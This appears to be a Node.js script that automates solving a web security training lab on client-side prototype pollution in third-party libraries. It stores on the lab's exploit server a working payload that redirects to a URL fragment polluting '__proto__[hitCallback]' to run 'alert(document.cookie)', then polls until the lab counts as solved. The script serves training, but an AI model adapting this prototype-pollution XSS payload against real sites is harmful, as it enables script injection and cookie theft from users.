const { runLab, getExploitServerUrl, storeExploit, isSolved } = require('./_common.cjs');

const TITLE = 'Client-side prototype pollution in third-party libraries';
const PATH = '/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries';

async function waitSolved(page, labUrl, attempts = 10, delay = 5000) {
  for (let i = 0; i < attempts; i += 1) {
    if (await isSolved(page, labUrl)) return true;
    await page.waitForTimeout(delay);
  }
  return false;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    const exploitUrl = await getExploitServerUrl(page, labUrl);
    const payload = `<script>location="${labUrl}/#__proto__[hitCallback]=alert%28document.cookie%29"</script>`;
    await storeExploit(page, exploitUrl, payload, true);
    await waitSolved(page, labUrl, 8, 5000);
  },
});
